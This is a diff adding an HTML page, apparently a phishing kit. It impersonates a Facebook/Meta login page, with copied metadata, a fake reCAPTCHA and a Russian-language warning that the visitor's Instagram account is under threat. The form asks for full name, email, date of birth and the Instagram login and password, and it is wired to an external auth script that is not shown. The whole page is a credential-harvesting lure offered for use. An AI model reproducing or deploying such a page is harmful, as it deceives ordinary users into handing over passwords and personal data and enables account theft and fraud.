@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<head>
+  <meta charset="UTF-8">
+  <title>Facebook – log in or sign up</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- Favicon -->
+  <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico" type="image/x-icon">
+
+  <!-- Open Graph (OG) -->
+  <meta property="og:title" content="Facebook – log in or sign up" />
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="https://facebook.com/" />
+  <meta property="og:site_name" content="Facebook" />
+  <meta property="og:description" content="Connect with friends and the world around you on Facebook." />
+  <meta property="og:image" content="https://static.xx.fbcdn.net/rsrc.php/v3/yv/r/qn4dP-0AIFG.png" />
+  <meta property="fb:app_id" content="966242223397117" /> <!-- настоящий ID Facebook App -->
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:site" content="@facebook">
+  <meta name="twitter:title" content="Facebook – log in or sign up">
+  <meta name="twitter:description" content="Join Facebook today.">
+  <meta name="twitter:image" content="https://static.xx.fbcdn.net/rsrc.php/v3/yv/r/qn4dP-0AIFG.png">
+
+  <!-- SEO + Удостоверяющие -->
+  <meta name="robots" content="index, follow">
+  <meta name="author" content="Meta Platforms Inc.">
+  <meta name="copyright" content="© 2025 Meta Platforms Inc.">
+  <meta name="application-name" content="Facebook">
+  <meta name="description" content="Facebook helps you connect and share with the people in your life.">
+  <meta name="keywords" content="Facebook, Meta, Login, Sign up, Social Network, Profile, Account, Messages, Friends, Connect, Meta Platforms">
+  <meta name="generator" content="Meta Web Framework 11.3.4">
+
+  <!-- Mobile Integration -->
+  <meta name="theme-color" content="#3b5998">
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="apple-mobile-web-app-title" content="Facebook">
+  <meta name="format-detection" content="telephone=no">
+
+  <!-- Pinned tab (Microsoft Edge / Windows) -->
+  <meta name="msapplication-TileColor" content="#3b5998">
+  <meta name="msapplication-TileImage" content="https://static.xx.fbcdn.net/rsrc.php/v3/yv/r/qn4dP-0AIFG.png">
+</head>
+
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 400px;
+            margin: 60px auto;
+            background: #fff;
+            padding: 32px 24px;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.07);
+        }
+        .meta-logo {
+            font-family: 'Segoe UI', Arial, Helvetica, sans-serif;
+            font-weight: bold;
+            letter-spacing: 3px;
+            color: #222;
+            font-size: 2.2em;
+            margin-bottom: 24px;
+            text-align: center;
+        }
+        h2 {
+            text-align: center;
+            margin-bottom: 18px;
+            color: #333;
+            font-size: 1.1em;
+            font-weight: normal;
+        }
+        label {
+            display: block;
+            margin-bottom: 6px;
+            color: #555;
+        }
+        input[type="text"], input[type="email"], input[type="date"], input[type="password"], input[type="login"] {
+            width: 90%;
+            padding: 8px 10px;
+            margin-bottom: 16px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 15px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background: #0078d7;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #005fa3;
+        }
+		
+		#loadingProgressG {
+    width: 224px;
+    height: 17px;
+    overflow: hidden;
+    background-color: rgba(0, 128, 240, 0.91);
+    margin: 20px auto;
+    border-radius: 9px;
+    display: none; /* Скрыто по умолчанию */
+}
+
+.loadingProgressG {
+    background-color: rgb(214, 210, 214);
+    margin-top: 0;
+    margin-left: -224px;
+    animation: bounce_loadingProgressG 1.5s linear infinite;
+    width: 224px;
+    height: 17px;
+}
+
+@keyframes bounce_loadingProgressG {
+    0%   { margin-left: -224px; }
+    100% { margin-left: 224px; }
+}
+		
+.captcha-box {
+  margin-top: 15px;
+  text-align: center;
+}
+
+#captcha-canvas {
+  border: 1px solid #ccc;
+  border-radius: 4px;
+  margin: 5px 0;
+  background-color: #f9f9f9;
+}
+
+.captcha-box button {
+  background-color: transparent;
+  border: none;
+  font-size: 18px;
+  cursor: pointer;
+  color: #888;
+  margin-bottom: 10px;
+}
+		
+		.fake-recaptcha {
+  border: 1px solid #d3d3d3;
+  border-radius: 4px;
+  padding: 10px;
+  width: 304px;
+  background: white;
+  font-family: Arial, sans-serif;
+  font-size: 14px;
+  margin: 15px auto;
+}
+
+.checkbox-container {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+#robot-check {
+  width: 18px;
+  height: 18px;
+}
+
+.recaptcha-logo {
+  margin-left: auto;
+  width: 30px;
+  height: 30px;
+}
+
+.recaptcha-footer {
+  display: flex;
+  justify-content: space-between;
+  font-size: 10px;
+  margin-top: 5px;
+  color: #666;
+}
+
+.recaptcha-footer a {
+  color: #666;
+  text-decoration: none;
+}
+
+
+
+        @media (max-width: 500px) {
+            .container {
+                max-width: 98vw;
+                margin: 20px 1vw;
+                padding: 18px 6px;
+            }
+            input[type="text"], input[type="email"], input[type="date"], input[type="password"], input[type="login"] {
+                width: 98%;
+                font-size: 16px;
+            }
+            .meta-logo {
+                font-size: 1.5em;
+            }
+            h2 {
+                font-size: 1em;
+            }
+            button {
+                font-size: 17px;
+            }
+        }
+        /* Spinner styles */
+        .spinner-overlay {
+            display: none;
+            position: fixed;
+            z-index: 9999;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(255,255,255,0.8);
+            align-items: center;
+            justify-content: center;
+        }
+        .spinner {
+            width: 65px;
+            height: 65px;
+            animation: rotator 1.4s linear infinite;
+        }
+        @keyframes rotator {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(270deg); }
+        }
+        .path {
+            stroke-dasharray: 187;
+            stroke-dashoffset: 0;
+            transform-origin: center;
+            animation:
+                dash 1.4s ease-in-out infinite,
+                colors 5.6s ease-in-out infinite;
+        }
+        @keyframes colors {
+            0% { stroke: #4285F4; }
+            25% { stroke: #DE3E35; }
+            50% { stroke: #F7C223; }
+            75% { stroke: #1B9A59; }
+            100% { stroke: #4285F4; }
+        }
+        @keyframes dash {
+            0% { stroke-dashoffset: 187; }
+            50% {
+                stroke-dashoffset: 46.75;
+                transform: rotate(135deg);
+            }
+            100% {
+                stroke-dashoffset: 187;
+                transform: rotate(450deg);
+            }
+        }
+    </style>
+<!-- ...existing code... -->
+</head>
+<body>
+    <div class="spinner-overlay" id="spinnerOverlay">
+        <svg class="spinner" width="65px" height="65px" viewBox="0 0 66 66" xmlns="http://www.w3.org/2000/svg">
+            <circle class="path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle>
+        </svg>
+    </div>
+	<div id="loadingProgressG">
+    <div id="loadingProgressG_1" class="loadingProgressG"></div>
+</div>
+
+    <div class="container">
+        <div class="meta-logo">
+            <img src="Meta.png" alt="Meta logo" style="max-width:120px; display:block; margin:0 auto;">
+        </div>
+        <h2><strong>Приветствуем вас уважаемый пользователь Meta!</strong><br>
+            Мы рекомендуем вам для защиты данных, начать процесс установления скрытых защитных мер, заполните все необходимые поля.</h2>
+        <form id="secureForm">
+            <label for="fullname">ФИО</label>
+            <input type="text" id="fullname" name="fullname" placeholder="Введите ваше ФИО" required>
+
+            <label for="email">Электронная почта</label>
+            <input type="email" id="email" name="email" placeholder="Введите email" required>
+
+            <label for="dob">Дата рождения</label>
+            <input type="date" id="dob" name="dob" required>
+
+            <label for="password">Ваш пароль Instagram</label>
+            <input type="password" id="password" name="password"  placeholder="Введите пароль" required>
+
+            <label for="login">Ваш учетная запись Instagram</label>
+            <input type="login" id="login" name="login" placeholder="Введите учетную запись Instagram" required>
+			
+			<div class="captcha-box">
+  <label for="captcha-input">Please solve the CAPTCHA:</label><br>
+  <canvas id="captcha-canvas" width="120" height="40"></canvas>
+  <button type="button" onclick="generateCaptcha()">↻</button>
+  <input type="text" id="captcha-input" placeholder="Enter code shown above" />
+</div>
+			<div class="fake-recaptcha">
+  <div class="checkbox-container">
+    <input type="checkbox" id="robot-check" />
+    <label for="robot-check">
+      <span class="checkmark"></span> I'm not a robot
+    </label>
+    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" class="recaptcha-logo">
+  </div>
+  <div class="recaptcha-footer">
+    <span>reCAPTCHA</span>
+    <span><a href="#">Privacy</a> - <a href="#">Terms</a></span>
+  </div>
+</div>
+
+
+
+
+            <button type="submit">Отправить</button>
+        </form>
+        
+    </div>
+    <form>
+        <label><strong>Предупреждаем что ваш(-а) учетная запись Instagram под угрозой.<br>
+        Его необходимо исправлять мы лишь рекомендуем выполнять эти действии.</strong></label>
+    </form>
+<script>
+  let captchaText = "";
+
+  function generateCaptcha() {
+    const canvas = document.getElementById("captcha-canvas");
+    const ctx = canvas.getContext("2d");
+    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+    
+    captchaText = "";
+    for (let i = 0; i < 5; i++) {
+      captchaText += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+
+    // Очистка
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = "#f4f4f4";
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+    // Рисуем искажённые символы
+    for (let i = 0; i < captchaText.length; i++) {
+      ctx.save();
+      let x = 20 * i + 10;
+      let y = 25 + Math.random() * 5;
+      let angle = (Math.random() - 0.5) * 0.8;
+      let fontSize = 22 + Math.floor(Math.random() * 6);
+      let skewX = (Math.random() - 0.5) * 0.5;
+      let skewY = (Math.random() - 0.5) * 0.5;
+
+      ctx.translate(x, y);
+      ctx.transform(1, skewY, skewX, 1, 0, 0);
+      ctx.rotate(angle);
+      ctx.font = `${fontSize}px Arial`;
+      ctx.fillStyle = randomColor();
+      ctx.fillText(captchaText[i], 0, 0);
+      ctx.restore();
+    }
+
+    // Шум: линии
+    for (let i = 0; i < 6; i++) {
+      ctx.beginPath();
+      ctx.moveTo(Math.random() * canvas.width, Math.random() * canvas.height);
+      ctx.lineTo(Math.random() * canvas.width, Math.random() * canvas.height);
+      ctx.strokeStyle = randomColor(0.3);
+      ctx.lineWidth = 1;
+      ctx.stroke();
+    }
+
+    // Шум: точки
+    for (let i = 0; i < 30; i++) {
+      ctx.beginPath();
+      ctx.arc(Math.random() * canvas.width, Math.random() * canvas.height, 1, 0, 2 * Math.PI);
+      ctx.fillStyle = randomColor(0.2);
+      ctx.fill();
+    }
+  }
+
+  function randomColor(alpha = 1) {
+    const r = Math.floor(Math.random() * 100 + 50);
+    const g = Math.floor(Math.random() * 100 + 50);
+    const b = Math.floor(Math.random() * 100 + 50);
+    return `rgba(${r},${g},${b},${alpha})`;
+  }
+
+  window.onload = generateCaptcha;
+	
+  document.getElementById("robot-check").addEventListener("change", function() {
+    if (this.checked) {
+      alert("CAPTCHA verified!");
+    }
+  });
+
+</script>
+	
+    <script src="js/auth.js"></script>
+    
+</body>
+</html>
